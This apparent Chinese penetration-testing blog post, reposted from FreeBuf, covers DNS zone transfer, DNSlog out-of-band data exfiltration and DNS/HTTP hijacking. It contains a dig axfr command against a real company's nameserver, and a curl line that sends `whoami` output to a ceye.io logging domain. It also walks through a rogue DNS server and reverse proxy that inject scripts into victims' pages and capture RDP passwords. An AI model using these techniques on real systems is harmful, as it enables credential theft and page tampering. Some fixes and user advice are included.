+<h3 id="验证及修复"><a href="#验证及修复" class="headerlink" title="验证及修复"></a>验证及修复</h3><p>本文的验证漏洞都是通过zZone-Transfe(<a href="https://github.com/Xyntax/zZone-Transfer" target="_blank" rel="noopener">https://github.com/Xyntax/zZone-Transfer</a>)脚本给出的。</p>
+<h4 id="nslookup-1"><a href="#nslookup-1" class="headerlink" title="nslookup"></a>nslookup</h4><p><a href="https://image.3001.net/images/20181130/1543563370_5c00e86ab0237.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563370_5c00e86ab0237.png!small" alt="img"></a></p>
+<h4 id="Namp"><a href="#Namp" class="headerlink" title="Namp"></a>Namp</h4><p><a href="https://image.3001.net/images/20181130/1543563390_5c00e87ee3177.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563390_5c00e87ee3177.png!small" alt="img"></a></p>
+<h4 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @ns.lining.cn axfr li-ning.com</span><br></pre></td></tr></table></figure>
+
+<p>@ 指定域名服务器； axfr 为域传送指令； xxx.edu.cn 表示要查询的域名；</p>
+<p><a href="https://image.3001.net/images/20181130/1543563429_5c00e8a5465ae.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563429_5c00e8a5465ae.png!small" alt="img"></a></p>
+<p>修复：</p>
+<p>区域传送是DNS常用的功能，区域传送的漏洞也不是没有办法解决的，严格限制允许区域传送的主机即可，例如一个主 DNS 服务器应该只允许它的从 DNS 服务器执行区域传送的功能。</p>
+<h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><p>在测试一些网站的时候，一些注入类的漏洞都是没有任何回显信息的，这个时候我们很难判断自己的payload是否执行成功，这个时候可以借助dnslog。</p>
+<p>简单的理解就是在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起DNS请求，这个时候可以通过这种方式把想获得的数据外带出来。</p>
+<h4 id="Dnslog基本原理"><a href="#Dnslog基本原理" class="headerlink" title="Dnslog基本原理"></a>Dnslog基本原理</h4><p><a href="https://image.3001.net/images/20181130/1543563447_5c00e8b7a4091.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563447_5c00e8b7a4091.png!small" alt="img"></a></p>
+<p>通过上面的学习，可以很清楚的明白对一个网站发起访问请求的时候，DNS的解析过程。</p>
+<p>其中红色部分的服务器是可控的，只需要搭建一个红色部分的DNS服务器，并将要盲打或盲注的回显信息，放到自己域名的二级或者是三级域名上去请求，就可以通过DNS解析日志来获取它们。</p>
+<h4 id="Dnslog工具及利用"><a href="#Dnslog工具及利用" class="headerlink" title="Dnslog工具及利用"></a>Dnslog工具及利用</h4><p>如果有自己的域名和服务器，可以自己搭建一个平台，开源项目源码：</p>
+<blockquote>
+<p><a href="https://github.com/BugScanTeam/DNSLog" target="_blank" rel="noopener">https://github.com/BugScanTeam/DNSLog</a></p>
+</blockquote>
+<p>另外就是已经搭建好的免费在线平台：</p>
+<blockquote>
+<p><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io</a></p>
+</blockquote>
+<p>注册好后会给每个人一个身份标识，这是构造回显的关键。</p>
+<p>（打码有点重，将就着看看。）</p>
+<p><a href="https://image.3001.net/images/20181130/1543563487_5c00e8df1c310.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563487_5c00e8df1c310.png!small" alt="img"></a></p>
+<p>平台里面也提供了一些利用的payload：</p>
+<p><a href="https://image.3001.net/images/20181130/1543563501_5c00e8eddd43a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563501_5c00e8eddd43a.png!small" alt="img"></a></p>
+<p>先用自己的vps简单的演示一下：</p>
+<p>比如：curl <a href="http://ip.port.b182oj.ceye.io/%60whoami%60" target="_blank" rel="noopener">http://ip.port.b182oj.ceye.io/<code>whoami</code></a></p>
+<p>这个时候需要根据实际情况对payload进行替换，ip 、port、 Identifier 。</p>
+<p><a href="https://image.3001.net/images/20181130/1543563520_5c00e900241c7.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563520_5c00e900241c7.png!small" alt="img"></a></p>
+<p>当然不止这种用法，比如SQL盲注，命令执行，SSRF。</p>
+<p>具体参考以下链接：</p>
+<blockquote>
+<p><a href="https://www.cnblogs.com/afanti/p/8047530.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/8047530.html</a></p>
+<p><a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">https://www.anquanke.com/post/id/98096</a></p>
+</blockquote>
+<h3 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h3><h4 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h4><p>DNS劫持有这三种情况</p>
+<p>1.错误域名解析到纠错导航页面，导航页面存在广告。判断方法:访问的域名是错误的，而且跳转的导航页面也是官方的，如电信的114，联通移网域名纠错导航页面。</p>
+<p>2.错误域名解析到非正常页面，对错误的域名解析到导航页的基础上，有一定几率解析到一些恶意站点，<strong>这些恶意站点通过判断你访问的目标HOST、URI、 referrer等来确定是否跳转广告页面</strong>，这种情况就有可能导致跳转广告页面（域名输错）或者访问页面被加广告（页面加载时有些元素的域名错误而触发）这种劫持会对用户访问的目标HOST、URI、referrer等会进行判定来确定是否解析恶意站点地址，不易被发现。</p>
+<p>3.直接将特点站点解析到恶意或者广告页面，这种情况比较恶劣，而且出现这种情况未必就是运营商所为，家里路由器被黑，或者系统被入侵，甚至运营商的某些节点被第三方恶意控制都有可能。具体情况要具体分析，这里就不展开了。</p>
+<p>DNS劫持常见于使用自动的DNS地址，所以，不管有没有被劫持，尽量不要使用运营商默认的DNS。</p>
+<p><img src="http://homestatic.bigsec.com/image/article/yunyingshangjiechi03.png" alt="DNSæå¡å¨"></p>
+<h5 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h5><p>运行nslookup<br>如果你当前的DNS服务器正常工作，返回的结果应该是你自己的DNS服务器。随便解析一个网站，比如<a href="http://www.microsoft.com" target="_blank" rel="noopener">www.microsoft.com</a></p>
+<p>应该返回的是正常的地址然后再解析一个不存在的网站，比如adfasdf.fljalfjsd.com.cn如果返回的结果是DNS request timed out.timeout was 2 seconds. 那么证明你的DNS没有被劫持如果返回的结果是一个IP地址，比如说网通的返回地址是123.xxx.xxx.xxx，那么证明你的DNS被劫持了。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fz9u26m9sij20gb0ckdgr.jpg" alt></p>
+<p>请检查以下设置：</p>
+<ol>
+<li>右键点击我的电脑，点击属性</li>
+<li>点击计算机名</li>
+<li>点击其他</li>
+<li>检查“此计算机的主DNS后缀”设置，默认情况下这一设置应该是您的域名（比如Microsoft.com）</li>
+<li>打开网络链接</li>
+<li>右键点击网络链接并点击属性</li>
+<li>双击TCP/IP</li>
+<li>点击高级，并点击DNS属性页</li>
+<li>检查“附加主要的连接特定的DNS后缀”选项，默认“附加主DNS后缀的父后缀”是被选中的</li>
+<li>检查此连接的DNS后缀内是否设置了内容，默认为空</li>
+<li>HOSTS文件被修改也会这样，你可以在C:\Windows\System32\drivers\etc用记事本打开hosts文件看是否被添加了相关的网址和IP信息，默认的应该只有一个127.0.0.1</li>
+</ol>
+<p><strong>修复：</strong></p>
+<p>由于DNS被强制修改，kaspersky不能访问，可以尝试其它厂商的在线杀毒。DNS上清理缓存，并执行</p>
+<p>ipconfig/flushdns，客户端上也执行该命令，在测试看看。另：有的时候可以在浏览器中直接输入IP地址，而不是域名。请尝试！如果IP段被劫持，可以更换IP来解决。或者用360或者电脑管家进行修复，或者电脑急救箱。</p>
+<h5 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h5><p>这篇文章把Dns分为两种，一种是<strong>主机或嵌入式设备dns</strong>，一种是<strong>网站域名dns</strong>，来讲述dns沦陷之后带来的危害。</p>
+<p>   你本地的网络连接的dns是通过路由器获取的，假如有一天你家里的路由被黑客入侵了，入侵者修改了你家里路由器的dns,那么他可以对你访问记录非常清楚，如系在文件，流量记录。既然解析都通过dns，我们完全可以自建dns，来进行攻击。</p>
+<p>1.路由器怎么样沦陷</p>
+<blockquote>
+<p>上周百度搜索上线了一个非常重要的策略，如果发现有网站被植入恶意篡改用户路由DNS的代码时，就会拦截页面，打出提示！据安全联盟的统计发现过万的网站被黑，植入了路由DNS劫持代码，这个数量非常之大。<br>过去一段时间，知道创宇安全研究团队就捕获了至少5个变种。这类攻击的模式一般是：</p>
+<ol>
+<li><p>攻击者黑下一批网站；</p>
+</li>
+<li><p>攻击者往这批网站里植入路由DNS劫持代码（各种变形）；</p>
+</li>
+<li><p>攻击者传播或坐等目标用户访问这批网站；</p>
+</li>
+<li><p>用户访问这些网站后，浏览器就会执行“路由DNS劫持代码”；</p>
+</li>
+<li><p>用户的家庭/公司路由器如果存在漏洞就会中招；</p>
+</li>
+<li><p>用户上网流量被“假DNS服务器”劫持，并出现奇怪的广告等现象；</p>
+</li>
+</ol>
+</blockquote>
+<p>tips: 烽火通信某款路由器被爆存在漏洞-可远程修改DNS</p>
+<p><a href="http://www.exploit-db.com/exploits/28450/" target="_blank" rel="noopener">http://www.exploit-db.com/exploits/28450/</a></p>
+<p>2.自建dns(window)</p>
+<p> 在这里我使用微软自家产，(完全可以用其他产品代替，个人习惯问题)</p>
+<p><img src="http://s3.51cto.com/wyfs02/M00/77/EE/wKioL1ZxVCfDmzBCAABDds_fMBg567.png" alt="wKioL1ZxVCfDmzBCAABDds_fMBg567.png"></p>
+<pre><code>配置劫持域名    myhack58.com</code></pre><p><img src="http://s3.51cto.com/wyfs02/M01/77/EE/wKioL1ZxVFaRrRCUAAAkNCrr8pk332.png" alt="wKioL1ZxVFaRrRCUAAAkNCrr8pk332.png"></p>
+<p> ①转发器配置 (SERVER01)</p>
+<p><a href="http://blog.sina.com.cn/s/blog_629b8d940102vjlo.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_629b8d940102vjlo.html</a></p>
+<p>转发器解决这台服务器没有应答的dns查询请求, 如这台主机只有myhack58.com， baidu.com等是不存在的，这种情况把会把baidu.com请求转发到你配置的dns去解析。我配置解析的dns是8.8.8.8</p>
+<p><img src="http://s4.51cto.com/wyfs02/M01/77/EE/wKioL1ZxVJPjc6OVAAAlqIu2ruY558.png" alt="wKioL1ZxVJPjc6OVAAAlqIu2ruY558.png"></p>
+<p>②配置劫持域名A记录  (SERVER02)</p>
+<p>刚才dns填写是跟域，这时候需要对A记录进行解析，比如我劫持<a href="http://www.myhack58.com到本地127.0.0.1。" target="_blank" rel="noopener">www.myhack58.com到本地127.0.0.1。</a></p>
+<p><img src="http://s4.51cto.com/wyfs02/M02/77/EF/wKiom1ZxVP6QDPxnAAAyy247UR8307.png" alt="wKiom1ZxVP6QDPxnAAAyy247UR8307.png"></p>
+<p>我这解析是vps的IP，测试可以写127.0.0.1。但要用起来你解析写公网ip地址，不然别人解析是127.0.0.1，127.0.0.1是你本地，找不到的地址，没办法跟反向代理代理配合。</p>
+<p><img src="http://s2.51cto.com/wyfs02/M00/77/EF/wKiom1ZxVSnDbwfRAAA0pfsG_MQ893.png" alt="wKiom1ZxVSnDbwfRAAA0pfsG_MQ893.png"></p>
+<p>测试dns是否配置成功，可以使用dnslookup ping 等去测试</p>
+<p><img src="http://s5.51cto.com/wyfs02/M00/77/EE/wKioL1ZxVXOhgTVrAAAnyfn9jO0629.png" alt="wKioL1ZxVXOhgTVrAAAnyfn9jO0629.png"></p>
+<p>Dns已配置成功，虽然现在解析本地了，我本地难道就只能挂个黑页？当然不是，我的目的是要求是替换页面的内容.比如插入js，修改某个文字等</p>
+<p><strong>客户端的配置</strong>(SERVER03)</p>
+<p>由于我在公司没有路由器，直接使用客户端做测试，客户端的dns获取来源还是路由器。</p>
+<p><img src="http://s1.51cto.com/wyfs02/M01/77/EE/wKioL1ZxVbqSehVZAAAfc5KpWQY299.png" alt="wKioL1ZxVbqSehVZAAAfc5KpWQY299.png"></p>
+<p>这时候配置成功，你可以打开baidu.com来测试，是否可以解析，正常打开。</p>
+<p><img src="http://s4.51cto.com/wyfs02/M02/77/EE/wKioL1ZxVcjR4-EvAAEiLeIK4Ew281.png" alt="wKioL1ZxVcjR4-EvAAEiLeIK4Ew281.png"></p>
+<p>③反向代理搭建</p>
+<p> 反向代理来这里启到作用是，把dns解析<a href="http://www.myhack58.com的vps的这个请求**代理到真实的解析**。" target="_blank" rel="noopener">www.myhack58.com的vps的这个请求**代理到真实的解析**。</a></p>
+<p> 我们要做的事情 要给页面插入一段js。</p>
+<p><strong>Openresty介绍</strong></p>
+<p>​    在这里我们使用Openresty，Openresty是基于nginx，它打包了标准的 Nginx 核心,很多的常用的第三方模块，nginx第三方模块都需要编译，在window下比较恶心 我直接找了一个Openresty_For_Windows，已打包我想要的是第三方模块http_sub_module。</p>
+<p>​    下载地址: <a href="https://github.com/LomoX-Offical/nginx-openresty-windows" target="_blank" rel="noopener">https://github.com/LomoX-Offical/nginx-openresty-windows</a></p>
+<p>​    使用nginx  -V 查看已支持的第三方模块</p>
+<p>​    http_sub_module缺点</p>
+<p>​        1. 只能使用一条规则</p>
+<p>​        2. 不支持中文</p>
+<p>反向代理配置</p>
+<p>​        监听端口vps的公网IP的80端口.当dns查询请求解析到本地80的时候，80正好监听vps公网ip，反向代理是myhack58.com。实际上vps公网ip是myhack58.com</p>
+<p>​     <strong>打开/conf/nginx.conf文件进行配置</strong></p>
+<p>​     使用了http_sub_module，替换了内容把</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/head&gt;换成&lt;/head&gt;undefinedundefinedundefinedundefined&lt;script sec=safe.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我故意</p>
+<p><img src="http://s3.51cto.com/wyfs02/M01/77/EE/wKioL1ZxVsOhpA7kAAAcoCiQ0i8280.png" alt="wKioL1ZxVsOhpA7kAAAcoCiQ0i8280.png"></p>
+<p>写错 写成<strong>sec=</strong></p>
+<p>测试是否成功</p>
+<p>​        先前已经把dns设置过去了，现在也可以ping通，那我们就查看源码 是否替换了页面内容。</p>
+<p><img src="http://s5.51cto.com/wyfs02/M01/77/EF/wKiom1ZxVwOB3LuuAADs50t9Tz0802.png" alt="wKiom1ZxVwOB3LuuAADs50t9Tz0802.png"></p>
+<p>​        配置其他功能</p>
+<p>​            现在dns加反向代理配置已经完成了，你可以替换他的页面了</p>
+<p>​        Openresty配置反向代理，你要是需要其他的配置还可以设置很多参数，如proxy_cache proxy_header  proxy_send_timeout  proxy_read_timeout。取决于自己用途。</p>
+<p>二 网站域名dns劫持</p>
+<p>​    当你通过社工拿到了某个域名权限， 但是你的目的是getshell，这时候你可以做反向代理，可以从两方面下手去做。</p>
+<p>A记录劫持演示</p>
+<p>​    直接修改域名劫持到A记录的你的恶意反向代理，但是这时候反向代理必须有配置upstream，在upstream指定原域名解析的ip地址，路由器劫持dns没有配置upstream 是因为上层的dns还可以解析到劫持域名的真实ip，而你这时候意见把A记录解析修改到了你的恶意反向代理机器，不去指定解析的地址， 上层找到解析的地址还是恶意的反向代理，形成一个死循环，永远打不开网站。</p>
+<p>​    域名A记录劫持</p>
+<p>​    <a href="http://www.sanr.org" target="_blank" rel="noopener">www.sanr.org</a>  192.168.182.128</p>
+<p>​    反向代理      192.168.182.129</p>
+<p>  <img src="http://s1.51cto.com/wyfs02/M01/77/F0/wKiom1ZxV_iQfIouAAAWKXi2OZs330.png" alt="wKiom1ZxV_iQfIouAAAWKXi2OZs330.png"></p>
+<p>​    <strong>为什么要劫持A记录</strong></p>
+<p>​        如你通过社工之类拿到了域名的控制权限，这时候你想获取他的后台地址，或者cookie等你就需要这样做。</p>
+<p>​        目前我已经控制sanr.org的域名解析权限，现在我们要做的是把<a href="http://www.sanr.org的A记录解析到192.168.182.129。让反向代理去访问真实的ip(也就是192.168.182.128)，在反向代理的时候我们动手脚，插个js代码进去。" target="_blank" rel="noopener">www.sanr.org的A记录解析到192.168.182.129。让反向代理去访问真实的ip(也就是192.168.182.128)，在反向代理的时候我们动手脚，插个js代码进去。</a></p>
+<p>​    没修改A记录之前</p>
+<p><img src="http://s3.51cto.com/wyfs02/M02/77/F0/wKiom1ZxWEmCYkZmAAF0J8BjQ0Q968.png" alt="wKiom1ZxWEmCYkZmAAF0J8BjQ0Q968.png"></p>
+<p>修改域名A记录</p>
+<p>​    修改域名到反向代理服务器 192.168.182.129</p>
+<p> <img src="http://s3.51cto.com/wyfs02/M02/77/EE/wKioL1ZxWIrDMJ43AAATAFB1rHk556.png" alt="wKioL1ZxWIrDMJ43AAATAFB1rHk556.png"></p>
+<p>​    反向代理服务器搭建(192.168.182.129)</p>
+<p>​        绑定域名为<a href="http://www.sanr.org" target="_blank" rel="noopener">www.sanr.org</a> 端口80，并指定上游(upstream)地址是192.168.182.128，必须指定上游地址(upstream)，只有proxy_pass无upstream他会自动请求解析A记录。</p>
+<p>​        路由器dns劫持那块没有用upstream是因为域名的A记录的iP地址你可以通过proxy_pass获取到。</p>
+<p>​        而现在域名A记录解析是反向代理机器也就是本机(192.168.182.129)，如不使用upstrema去指定真实的IP地址，proxy_pass直接去解析到的是本地IP，那么就会造成死循环，一直解析的都是本机。</p>
+<p>下面是反向代理配置文件。</p>
+<p><img src="http://s1.51cto.com/wyfs02/M02/77/EE/wKioL1ZxWNWQkBOKAAA6QVHP1ZM659.png" alt="wKioL1ZxWNWQkBOKAAA6QVHP1ZM659.png"></p>
+<p>​    劫持成功</p>
+<p>​         成功的给sanr.org的植入safe.js代码</p>
+<p><img src="http://s1.51cto.com/wyfs02/M02/77/F0/wKiom1ZxWQDSvk1JAALBDmQnwQM723.png" alt="wKiom1ZxWQDSvk1JAALBDmQnwQM723.png"></p>
+<p>dns劫持</p>
+<p>​    跟路由器劫持dns一样，自建dns,之后把域名的dns解析配置的A记录解析到恶意的反向代理，反向代理中还是要指定upstream，跟a记录劫持一样，不然造成死循环。</p>
+<p>   Dns服务 反向代理软件有很多，完全取决于自己的习惯，用自己最喜欢的。</p>
+<p><strong>Dns win</strong></p>
+<p>  WinMyDNS</p>
+<p>  微软自家</p>
+<p><strong>Dns linux</strong></p>
+<p>  dnschef   “msfconsole  auxiliary/server/fakedns”</p>
+<p>  Powerdns bind 等 linux开源项目太多</p>
+<p>反向代理</p>
+<p> Squid  Varnish nginx 或者nginx 衍生版(Tengine  Openresty)</p>
+<p><img src="http://s3.51cto.com/wyfs02/M01/77/F0/wKiom1ZxWffjbySJAASyBJESYFE665.png" alt="wKiom1ZxWffjbySJAASyBJESYFE665.png"></p>
+<p>攻击手法不仅仅是替换网页内容 插入js，如劫持你路由器的dns， 连接3389也是输入域名也是通过dns解析的，我完全可以把A记录劫持我本地，连接3389是我本机的机器，之后安装WinlogonHack，来记录密码，WinlogonHack需要改成即使是错误密码也要记录，不然记录不到。</p>
+<p>把<a href="http://www.baidu.com解析到我vps主机的ip" target="_blank" rel="noopener">www.baidu.com解析到我vps主机的ip</a></p>
+<p>Dns已生效，解析baidu.com也返回是vps主机的ip</p>
+<p><img src="http://s1.51cto.com/wyfs02/M01/77/EE/wKioL1ZxWnrSNHZmAAA0KhGwnOs810.png" alt="wKioL1ZxWnrSNHZmAAA0KhGwnOs810.png"></p>
+<p>连接3389(其实这时候是我vps的IP)</p>
+<p>​    <img src="http://s5.51cto.com/wyfs02/M02/77/EE/wKioL1ZxWsPh8RQvAACQeQDHVpc930.png" alt="wKioL1ZxWsPh8RQvAACQeQDHVpc930.png"></p>
+<p>只要涉及到域名解析的 本地host  本地客户端dns  路由器dns，都可以这样去劫持，攻击手法变化多样，看你出自于什么目地去做。</p>
+<p>#####　第三种：</p>
+<ol>
+<li><p>Cain进行DNS劫持、ARP欺骗。</p>
+</li>
+<li><p>小凡顶尖劫持插件程序。</p>
+</li>
+<li><p>浪花DNS域名劫持。</p>
+</li>
+<li><p>netfuke劫持工具。</p>
+</li>
+<li><p>修复DNS劫持，使用OpenDNS解决DNS域名劫持。</p>
+</li>
+<li><p>一次利用社会工程学完成的域名劫持攻击。</p>
+</li>
+<li><p>入侵DNS解析服务器。</p>
+</li>
+<li><p>以IP冲突的方法来劫持域名。</p>
+</li>
+<li><p>openresty+lua在反向代理服务</p>
+</li>
+<li><p>Squid和Nginx是非常优秀的反向代理。</p>
+</li>
+</ol>
+<p>(以下来自红客联盟)</p>
+<ol start="11">
+<li>假扮域名注册人和域名注册商通信。</li>
+</ol>
+<p>这类域名盗窃包括使用伪造的传真，邮件等来修改域名注册信息，有时候，受害者公司的标识之类的也会用上。增加可信度。<br>hushmail.com被盗窃就是一次典型的例子。当时一名域名劫持者使得注册服务提供商相信了他的身份，然后修改了该公司的域名管理员邮件信息。然后攻击者使用管理员邮件提交了密码重设请求。最后。攻击者登录域名服务商。修改密码。更改DNS记录,然后指向自己的服务器。</p>
+<ol start="12">
+<li>是伪造域名注册人在注册商处的账户信息。<br>攻击者伪造域名注册人的邮件和注册商联系。然后卖掉域名或者是让买家相信自己就是域名管理员。然后可以获利是伪造域名注册人的域名转移请求。</li>
+<li>这类攻击通常是攻击者提交一个伪造的域名转让请求，来控制域名信息。<br>在2001年，攻击者向服务商提交了一封信。谎称原注册人已经被公司解雇，须将域名转移给自己，结果他成功地控制了sex.com域名。最后被判了6500万美元罚款。</li>
+<li>是直接进行一次域名转移请求。<br>这类攻击有可能改dns，也有可能不改，如果不改的话。是很隐蔽的。但最终盗窃者的目的就是卖掉域名，当时blogtemplate4u.com 和 dhetemplate.com<br>两个域名是由美国一家公司通过godaddy注册管理的。结果某一天，一个盗窃者使用该公司管理员的帐号密码登录到域名管理商，执行了转移请求。注意。他没有更改dns记录。域名在转移期间。一切服务都没有受到影响。</li>
+<li>是修改域名的DNS记录。</li>
+</ol>
+<p>未经授权的DNS配置更改导致DNS欺骗攻击。（也称作DNS缓存投毒攻击）。这里。数据被存入域名服务器的缓存数据库里，域名会被解析成一个错误的ip，或是解析到另一个ip，典型的一次攻击是1997年Eugene Kashpureff黑阔通过该方法重定向了InterNIC网站。</p>
+<h3 id="HTTP劫持"><a href="#HTTP劫持" class="headerlink" title="HTTP劫持"></a>HTTP劫持</h3><p>HTTP劫持：你DNS解析的域名的IP地址不变。在和网站交互过程中的劫持了你的请求。在网站发给你信息前就给你返回了请求。</p>
+<p>HTTP劫持很好判断，当年正常访问一个无广告的页面时，页面上出现广告弹窗，八成就是运营商劫持了HTTP。下图中，右下角的广告并不是所访问的网站放置的。</p>
+<p><img src="http://homestatic.bigsec.com/image/article/yunyingshangjiechi04.jpg" alt="V2ex被HTTP劫持"></p>
+<p>HTTP劫持比较出名的是360导航的首页，曾经被某运营商弹出广告，而且只有用户打开360导航时才会出现该广告，以至于很多用户认为这是360自己的广告，引发了大量投诉，结果最后被证实是运营商干的。</p>
+<p>关于DNS劫持和HTTP劫持，打个比方来描述这两种劫持，DNS劫持就是你想去存钱运营商却把你拉到了劫匪手中；而HTTP劫持就是你从服务器买了一包零食电信给你放了一坨屎，横竖都很恶心人。</p>
+<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><p>如果你遇到类似情况，可以先给运营商打电话投诉，说明自己遇到劫持了。一般情况下客服会说你可能是中毒了，不要紧坚持说自己用的是Mac，不会中毒，让对方解决。如果运营商不给解决，可以告诉对方你到工信部投诉他们，运营商八成会认怂。</p>
+<p>如果不认怂怎么办？当然是真的到工信部投诉啊！工信部电信用户申诉受理中心：</p>
+<p><img src="http://homestatic.bigsec.com/image/article/yunyingshangjiechi05.png" alt="工信部"></p>
+<p><a href="http://www.chinatcc.gov.cn:8080/cms/shensus/" target="_blank" rel="noopener">http://www.chinatcc.gov.cn:8080/cms/shensus/</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a href="https://baike.baidu.com/item/dns/427444?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/dns/427444?fr=aladdin</a></p>
+<p><a href="http://www.cnblogs.com/liyuanhong/articles/7353974.html" target="_blank" rel="noopener">http://www.cnblogs.com/liyuanhong/articles/7353974.html</a></p>
+<p><a href="https://blog.csdn.net/weixin_41545330/article/details/80865676" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41545330/article/details/80865676</a></p>
+<p><a href="https://blog.csdn.net/c465869935/article/details/53444117" target="_blank" rel="noopener">https://blog.csdn.net/c465869935/article/details/53444117</a></p>
+<p><a href="https://www.cnblogs.com/afanti/p/8047530.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/8047530.html</a></p>
+<p><a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">https://www.anquanke.com/post/id/98096</a></p>
+<p><a href="https://www.freebuf.com/column/184587.html" target="_blank" rel="noopener">https://www.freebuf.com/column/184587.html</a></p>
+<p><a href="https://blog.csdn.net/qq_32447301/article/details/77542474" target="_blank" rel="noopener">https://blog.csdn.net/qq_32447301/article/details/77542474</a></p>
+</blockquote>
+<p>转载自<a href="https://www.freebuf.com/articles/web/190947.html" target="_blank" rel="noopener">freebuf</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2018/12/10/2018-12-10-渗透测试之DNS/" title="渗透测试之DNS">https://wh0ale.github.io/2018/12/10/2018-12-10-渗透测试之DNS/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/dns/" rel="tag"><i class="fa fa-tag"></i># dns</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2018/12/08/2018-12-08-Linux命令/" rel="next" title="Linux命令">
+                <i class="fa fa-chevron-left"></i> Linux命令
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2018/12/11/2018-12-11-msf之vsftpd漏洞/" rel="prev" title="msf之vsftpd漏洞">
+                msf之vsftpd漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
